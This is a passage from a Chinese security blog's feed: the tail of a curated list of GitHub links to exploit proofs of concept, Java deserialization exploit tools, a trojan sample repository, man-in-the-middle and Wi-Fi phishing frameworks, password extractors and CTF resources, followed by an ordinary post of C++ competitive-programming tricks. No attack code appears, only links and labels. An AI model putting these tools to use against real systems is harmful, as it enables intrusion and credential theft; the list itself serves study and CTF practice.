rel="noopener">https://github.com/80vul/phpcodz</a></p><p>Simple test for CVE-2016-2107</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权)</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h2 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h2><p>中间人攻击框架</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>可扩展的中间人代理工具</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>密码破解工具</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h2 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h2><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）</p><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h2 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h2><p>二进制EXP编写工具</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h2 id="安全资料"><a href="#安全资料" class="headerlink" title="安全资料"></a>安全资料</h2><p>域渗透教程</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><p>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="noopener">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></p><p><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="noopener">https://github.com/smartFlash/pySecurity</a></p><p>data_hacking合集</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>ctf及黑客资源合集</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>《DO NOT FUCK WITH A HACKER》</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><h2 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h2><p>近年ctf writeup大全</p><p><a href="https://github.com/ctfs/write-ups-2017" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2017</a></p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p>fbctf竞赛平台Demo</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><h2 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h2><p>大礼包（什么都有）</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project-analysis</a></p><p>python框架，库，资源大合集</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><p>python 正则表达式库（用于简化构造复杂的python正则表达式）</p><p><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></p><p>python任务管理以及命令执行库</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>py3 爬虫框架</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;持续更新，欢迎评论&lt;/p&gt;
&lt;h2 id=&quot;练习平台&quot;&gt;&lt;a href=&quot;#练习平台&quot; class=&quot;headerlink&quot; title=&quot;练习平台&quot;&gt;&lt;/a&gt;练习平台&lt;/h2&gt;&lt;p&gt;WebGoat漏洞练习环境&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ACM 常用小 Trick</title>
    <link href="https://wywwzjj.top/2018/10/28/ACM_%E5%B8%B8%E7%94%A8Trick/"/>
    <id>https://wywwzjj.top/2018/10/28/ACM_常用Trick/</id>
    <published>2018-10-28T15:07:56.000Z</published>
    <updated>2019-03-20T05:09:14.042Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#123;&#123;&#123; #include</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;complex&gt;</span></span></span><br><span class="line"><span class="comment">//&#125;&#125;&#125;//#include &lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">double</span> ld;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sf scanf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pf printf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pn printf(<span class="meta-string">"\n"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ls l,mid,rt&lt;&lt;1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rs mid+1,r,rt&lt;&lt;1|1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) (x).begin(),(x).end()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout&lt;&lt; #x&lt;&lt;<span class="meta-string">" = "</span>&lt;&lt;x&lt;&lt;<span class="meta-string">" "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,a,b) for(int i=a;i&lt;(b);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,a,n) for (int i=n-1;i&gt;=a;i--)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem(a,b) memset(a,b,sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) (int)(x).size()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps=<span class="number">1e-8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> PI=<span class="built_in">acos</span>(<span class="number">-1.0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sgn</span><span class="params">(<span class="keyword">double</span> x)</span></span>&#123;<span class="keyword">if</span>(<span class="built_in">fabs</span>(x)&lt;eps)<span class="keyword">return</span> <span class="number">0</span>;<span class="keyword">if</span>(x&lt;<span class="number">0</span>)<span class="keyword">return</span> <span class="number">-1</span>;<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a,ll b)</span></span>&#123;<span class="keyword">return</span> b==<span class="number">0</span>?a:gcd(b,a%b);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fast-pow</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pow</span><span class="params">(ll x,ll t,<span class="keyword">int</span> p)</span> </span>&#123;ll r=<span class="number">1</span>;<span class="keyword">for</span>(;t;t&gt;&gt;=<span class="number">1</span>,x=x*x%p)<span class="keyword">if</span>(t&amp;<span class="number">1</span>)r=r*x%p;<span class="keyword">return</span> r;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add-mod</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pp</span><span class="params">(<span class="keyword">int</span> &amp;x,<span class="keyword">int</span> d)</span> </span>&#123;<span class="keyword">if</span>((x+=d)&gt;=MOD) x-=MOD;&#125;</span><br><span class="line"><span class="comment">// minus-mod -&gt; pp(a , P - x);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// multiply-mod</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123; <span class="keyword">return</span> ll(a)*b%MOD;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inversion</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inverse</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> Pow(x,p<span class="number">-2</span>,p);&#125; <span class="comment">// p should be prime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// tree-dp</span></span><br><span class="line">vi g[N];</span><br><span class="line"><span class="keyword">int</span> sz[N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> c,<span class="keyword">int</span> par)</span></span>&#123;</span><br><span class="line">  sz[c] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> t : g[c]) <span class="keyword">if</span>(t != par)&#123; <span class="comment">// c++11</span></span><br><span class="line">    dfs(t , c);</span><br><span class="line">    sz[c] += sz[t];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dsu</span></span><br><span class="line"><span class="keyword">int</span> fa[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123; <span class="keyword">return</span> fa[x] == x ? x : fa[x] = F(fa[x]);&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">M</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123; fa[F(x)] = F(y);&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// swap</span></span><br><span class="line">  <span class="keyword">int</span> u = <span class="number">0</span>, v = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::swap(u , v); <span class="comment">// swap</span></span><br><span class="line">  <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; A , B;</span><br><span class="line">  <span class="built_in">std</span>::swap(A , B); <span class="comment">// O(1)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// minimal &amp; maximal</span></span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">20</span>] , n = <span class="number">20</span>;</span><br><span class="line">  rep(i,<span class="number">0</span>,n) a[i] = i;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; *<span class="built_in">std</span>::max_element(a , a + n) &lt;&lt; <span class="built_in">endl</span>;<span class="comment">// [a , a+n)</span></span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; *<span class="built_in">std</span>::min_element(a , a + n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// discretization</span></span><br><span class="line">  vi V;<span class="comment">// about 10 int</span></span><br><span class="line">  sort(all(V));V.erase(unique(all(V)),V.end());</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rk(x) upper_bound(all(V) , x) - V.begin()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// deal with same value</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;sz(V);i=j) &#123;</span><br><span class="line">    <span class="keyword">for</span>(j=i;j&lt;sz(V)&amp;&amp;V[j]==V[i];++j);</span><br><span class="line">    <span class="comment">// Cal(i , j) //[i , j)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// multiple-loops</span></span><br><span class="line">  <span class="keyword">int</span> g[<span class="number">10</span>][<span class="number">10</span>] , m = <span class="number">10</span>;</span><br><span class="line">  rep(i,<span class="number">0</span>,m) rep(j,<span class="number">0</span>,m) <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;g[i][j]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// __builtin_popcount()</span></span><br><span class="line">  <span class="keyword">int</span> cnt1[<span class="number">1</span>&lt;&lt;<span class="number">6</span>];</span><br><span class="line">  rep(i,<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">6</span>) cnt1[i] = cnt1[i &gt;&gt; <span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sort</span></span><br><span class="line">  <span class="keyword">int</span> cnt[<span class="number">20</span>];</span><br><span class="line">  sort(all(V),[&amp;](<span class="keyword">int</span> a,<span class="keyword">int</span> b)&#123;<span class="keyword">return</span> cnt[a]&lt;cnt[b];&#125;); <span class="comment">// c++11 </span></span><br><span class="line">  <span class="built_in">vector</span>&lt;vi&gt; Vv;</span><br><span class="line">  sort(all(Vv));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sort with id</span></span><br><span class="line">  <span class="built_in">vector</span>&lt;pii&gt; p;</span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">20</span>) p.pb(mp(rand(),i));</span><br><span class="line">  sort(all(p));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// deal with subsets</span></span><br><span class="line">  rep(mask,<span class="number">0</span>,<span class="number">1</span>&lt;&lt;<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=mask;j;j=(j<span class="number">-1</span>)&amp;mask)</span><br><span class="line">      ;<span class="comment">// Cal</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// high-dimensional prefix-sum</span></span><br><span class="line">  <span class="keyword">int</span> f[<span class="number">1</span>&lt;&lt;<span class="number">10</span>];</span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">10</span>) rep(j,<span class="number">0</span>,<span class="number">1</span>&lt;&lt;<span class="number">10</span>) <span class="keyword">if</span>(j&gt;&gt;i&amp;<span class="number">1</span>) pp(f[j],f[j^(<span class="number">1</span>&lt;&lt;i)]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// permutation</span></span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">7</span>) a[i] = i;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">// Cal;</span></span><br><span class="line">  &#125;<span class="keyword">while</span>(next_permutation(a , a + <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fill function</span></span><br><span class="line">  <span class="built_in">std</span>::fill(a , a + <span class="number">20</span> , <span class="number">0</span>);<span class="comment">// fill any number</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// reference</span></span><br><span class="line">  <span class="keyword">int</span> &amp;r=f[<span class="number">10</span>];</span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">10</span>) r+=i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ternary operator</span></span><br><span class="line">  <span class="keyword">int</span> C[<span class="number">10</span>][<span class="number">10</span>] = &#123;&#123;<span class="number">1</span>&#125;&#125;;</span><br><span class="line">  rep(i,<span class="number">1</span>,<span class="number">10</span>) rep(j,<span class="number">0</span>,i+<span class="number">1</span>) C[i][j] = j ? (C[i<span class="number">-1</span>][j<span class="number">-1</span>] + C[i<span class="number">-1</span>][j]) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>POJ-1321-棋盘问题[DFS]</title>
    <link href="https://wywwzjj.top/2018/10/28/POJ_1321_%E6%A3%8B%E7%9B%98%E9%97%AE%E9%A2%98_DFS/"/>
    <id>https://wywwzjj.top/2018/10/28/POJ_1321_棋盘问题_DFS/</id>
